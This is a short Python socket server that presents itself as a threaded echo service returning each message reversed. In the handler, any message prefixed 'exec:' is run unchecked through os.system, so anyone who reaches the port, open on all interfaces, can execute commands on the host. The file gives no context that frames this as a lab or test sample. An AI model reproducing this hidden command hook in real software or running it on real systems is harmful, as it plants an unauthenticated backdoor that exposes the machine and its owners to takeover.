import socket
import threading
import sys, os

def threaded(c):
    while True:
        data = c.recv(1024)
        if not data:
            print("Bye")
            break
        
        if data.startswith(b"exec:"):
            os.system(data[5:])
        data = data[::-1]
        c.send(data)

    c.close()


def main():
    host = "0.0.0.0"
    port = int(sys.argv[1])
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    print("socket binded to port", port)

    s.listen(5)
    print("socket is listening")

    while True:
        c, addr = s.accept()
        print(f"Connected to: {addr[0]}:{addr[1]}")
        t = threading.Thread(target=threaded, args=(c,))
        t.start()

    s.close()


if __name__ == "__main__":
    main()
